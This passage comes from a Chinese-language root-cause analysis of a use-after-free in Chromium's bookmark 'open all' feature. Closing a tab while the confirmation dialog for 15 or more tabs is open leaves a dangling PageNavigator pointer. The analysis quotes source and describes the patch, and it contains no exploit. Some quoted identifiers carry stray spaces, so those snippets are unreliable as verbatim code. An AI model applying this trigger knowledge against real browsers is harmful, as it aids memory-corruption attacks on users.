    uint32_t close_types) {
//---snip---
    std::unique_ptr<DetachedWebContents> dwc =
        std::make_unique<DetachedWebContents>(
            original_indices[i], current_index,
            DetachWebContentsImpl(current_index,
                                  close_types & CLOSE_CREATE_HISTORICAL_TAB,
                                  /*will_delete=*/true));
    notifications.detached_web_contents.push_back(std::move(dwc));
//---snip---
  // When unload handler is triggered for all items, we should wait for the
  // result.
  if (!notifications.detached_web_contents.empty())
    SendDetachWebContentsNotifications(&notifications);
}
```

在`TabStripModel::CloseWebContentses`函数中选调用`DetachWebContentsImpl`函数获取需要关闭的`WebContents`对象，如下所示：

```cpp
//chrome/browser/ui/tabs/tab_strip_model.cc
std::unique_ptr<content::WebContents> TabStripModel::DetachWebContentsImpl(
    int index,
    bool create_historical_tab,
    bool will_delete) {
//---snip---
  WebContents* raw_web_contents = GetWebContentsAtImpl(index);
//---snip---
  std::unique_ptr<WebContentsData> old_data = std::move(contents_data_[index]);
//---snip---
  return old_data->ReplaceWebContents(nullptr);
}

WebContents* TabStripModel::GetWebContentsAtImpl(int index) const {
  CHECK(ContainsIndex(index))
      << "Failed to find: " << index << " in: " << count() << " entries.";
  return contents_data_[index]->web_contents();
}

std::unique_ptr<WebContents> TabStripModel::WebContentsData::ReplaceWebContents(
    std::unique_ptr<WebContents> contents) {
  contents_.swap(contents);
  Observe(contents_.get());
  return contents;
}
```

在`TabStripModel::DetachWebContentsImpl`函数中通过`GetWebContentsAtImpl`函数获取需要关闭的`WebContents`对象保存在`old_data`中，最后通过`ReplaceWebContents`返回指向`WebContents`对象的指针。

在获取到指向需要释放的`WebContents`对象的指针后，程序继续执行`TabStripModel::CloseWebContentses`函数，调用`SendDetachWebContentsNotifications`函数，如下所示：

```cpp
void TabStripModel::SendDetachWebContentsNotifications(
    DetachNotifications* notifications) {
//---snip---
  for (auto& dwc : notifications->detached_web_contents) {
    if (notifications->will_delete) {
      // This destroys the WebContents, which will also send
      // WebContentsDestroyed notifications.
      dwc->contents.reset();
    }
  }
//---snip---
}
```

该函数将指针进行重置，该操作会删除指向的对象，删除时调用`WebContents`对象的析构函数，将对象释放。

#### 2.3.3 对象使用

当在书签栏上点击右键时，chrome 进程会收到相关的消息，鼠标松开后会调用`ContextMenuController::ShowContextMenuForView`函数，该调用链会新建一个`BookmarkContextMenuController`对象，如下所示：

```cpp
//ui/views/context_menu_controller.cc
void ContextMenuController::ShowContextMenuForView(
    View* source,
    const gfx::Point& point,
    ui::MenuSourceType source_type) {
//---snip---
  ShowContextMenuForViewImpl(source, point, source_type);
//---snip---
}

//chrome/browser/ui/views/bookmarks/bookmark_bar_view.cc
void BookmarkBarView::ShowContextMenuForViewImpl(
    views::View* source,
    const gfx::Point& point,
    ui::MenuSourceType source_type) {
//---snip---
  context_menu_ = std::make_unique<BookmarkContextMenu>(
      GetWidget(), browser_, browser_->profile(),
      browser_->tab_strip_model()->GetActiveWebContents(),
      BOOKMARK_LAUNCH_LOCATION_ATTACHED_BAR, parent, nodes, close_on_remove);
  context_menu_->RunMenuAt(point, source_type);
}
```

在`BookmarkBarView::ShowContextMenuForViewImpl`函数中会创建一个指向`BookmarkContextMenu`对象的指针，该操作同时会调用其构造函数，其中第四个参数为`browser_->tab_strip_model()->GetActiveWebContents()`，该函数会返回一个`WebContents`对象，如下所示：

```cpp
//chrome/browser/ui/tabs/tab_strip_model.cc
WebContents* TabStripModel::GetActiveWebContents() const {
  return GetWebContentsAt(active_index());
}

WebContents* TabStripModel::GetWebContentsAt(int index) const {
  if (ContainsIndex(index))
    return GetWebContentsAtImpl(index);
  return nullptr;
}

WebContents* TabStripModel::GetWebContentsAtImpl(int index) const {
  CHECK(ContainsIndex(index))
      << "Failed to find: " << index << " in: " << count() << " entries.";
  return contents_data_[index]->web_contents();
}
```

其返回的对象正是上一节所分析的对象，并将其做为第四个参数调用`BookmarkContextMenuController`的构造函数，如下所示：

```cpp
//chrome/browser/ui/views/bookmark/bookmark_context_menu.cc
BookmarkContextMenu::BookmarkContextMenu(
    views::Widget* parent_widget,
    Browser* browser,
    Profile* profile,
    PageNavigator* page_navigator,
    BookmarkLaunchLocation opened_from,
    const BookmarkNode* parent,
    const std::vector<const BookmarkNode*>& selection,
    bool close_on_remove)
    : controller_(new BookmarkContextMenuController(
          parent_widget ? parent_widget->GetNativeWindow() : nullptr,
          this,
          browser,
          profile,
          page_navigator,
          opened_from,
          parent,
          selection)),
      parent_widget_(parent_widget),
      menu_(new views::MenuItemView(this)),
      menu_runner_(new views::MenuRunner(menu_,
                                         views::MenuRunner::HAS_MNEMONICS |
                                             views::MenuRunner::IS_NESTED |
                                             views::MenuRunner::CONTEXT_MENU)),
      observer_(nullptr),
      close_on_remove_(close_on_remove) 
//---snip---
//chrome/browser/ui/bookmarks/bookmark_context_menu_controller.cc
BookmarkContextMenuController::BookmarkContextMenuController(
    gfx::NativeWindow parent_window,
    BookmarkContextMenuControllerDelegate* delegate,
    Browser* browser,
    Profile* profile,
    PageNavigator* navigator,
    BookmarkLaunchLocation opened_from,
    const BookmarkNode* parent,
    const std::vector<const BookmarkNode*>& selection)
    : parent_window_(parent_window),
      delegate_(delegate),
      browser_(browser),
      profile_(profile),
      navigator_(navigator),
      opened_from_(opened_from),
      parent_(parent),
      selection_(selection),
      model_(BookmarkModelFactory::GetForBrowserContext(profile))
```

在`BookmarkContextMenu`的构造函数中又会创建一个`BookmarkContextMenuController`对象，并将获取的`WebContents`对象保存到`navigator_`成员变量中。

当用户点击打开全部标签后，通过 windows 的消息机制调用到`BookmarkContextMenuController::ExecuteCommand`函数，最终调用到`OpenAll`函数，如下所示：

```cpp
//chrome/browser/ui/bookmarks/bookmark_context_menu_controller.cc
void BookmarkContextMenuController::ExecuteCommand(int id, int event_flags) {
//---snip---
  switch (id) {
    case IDC_BOOKMARK_BAR_OPEN_ALL:
    case IDC_BOOKMARK_BAR_OPEN_ALL_INCOGNITO:
    case IDC_BOOKMARK_BAR_OPEN_ALL_NEW_WINDOW: {
//---snip---
      chrome::OpenAll(parent_window_, navigator_, selection_,
                      initial_disposition, profile_);
      break;
    }
//---snip---
}

//chrome/browser/ui/bookmarks/bookmark_utils_desktop.cc
void OpenAll(gfx::NativeWindow parent,
             content::PageNavigator* navigator,
             const std::vector<const BookmarkNode*>& nodes,
             WindowOpenDisposition initial_disposition,
             content::BrowserContext* browser_context) {
  if (!ShouldOpenAll(parent, nodes))
    return;
//---snip---
  for (std::vector<GURL>::const_iterator url_it = urls.begin();
       url_it != urls.end(); ++url_it) {
    content::WebContents* opened_tab = navigator->OpenURL(
        content::OpenURLParams(*url_it, content::Referrer(), disposition,
                               ui::PAGE_TRANSITION_AUTO_BOOKMARK, false));
//---snip---
  }
}
```

在`OpenAll`函数中，首先调用`ShouldOpenAll`函数，该函数首先检查要打开的页面是否大于等于15个，如果大于等于15个则弹出一个对话框要求用户进行确认：

```cpp
//chrome/browser/ui/bookmarks/bookmark_utils_desktop.cc
bool ShouldOpenAll(gfx::NativeWindow parent,
                   const std::vector<const BookmarkNode*>& nodes) {
  size_t child_count = GetURLsToOpen(nodes).size();
  if (child_count < kNumBookmarkUrlsBeforeP rompting)
    return true;

  return ShowQuestionMessageBox(
             parent, l10n_util::GetStringUTF16(IDS_PRODUCT_NAME),
             l10n_util::GetStringFUTF16(IDS_BOOKMARK_BAR_SHOULD_OPEN_ALL,
                                        b ase::NumberToString16(child_count))) ==
         MESSAGE_BOX_RESULT_YES;
}

size_t kNumBookmarkUrlsBeforeP rompting = 15;
```

用户确认打开后会通过指针调用`navigator`的相关函数获取信息打开标签页。

#### 2.3.4 UAF

从上面的分析中可知，在`OpenAll`函数的`navigator`变量指向了一个`WebContents`对象，当标签大于等于15个时会弹出对话框要求用户确认，此时弹出的对话框会在 UI 线程中不断循环。而如果在等待用户确认时页面被关闭，则`navigator`指针会指向一个已经被释放的对象，而在用户确认后函数会正常进行后续流程，对`navigator`进行解引用，触发 UAF。

三 漏洞修补
------

漏洞补丁：[Diff - 58ae65c7f9a276777e611db69633b2ff8ed32cb7^! - chromium/src - Git at Google](https://chromium.googlesource.com/chromium/src/+/58ae65c7f9a276777e611db69633b2ff8ed32cb7)

补丁使用`chrome::OpenAllIfAllowed`替换`chrome::OpenAll`函数，替换的函数直接返回，如果需要提示用户则使用异步的方式打开标签页。`chrome::OpenAllIfAllowed`函数不再直接持有`content::PageNavigator`指针，而是通过回调的方式获取该指针，这样就可以确保使用的是有有效的 PageNavigator。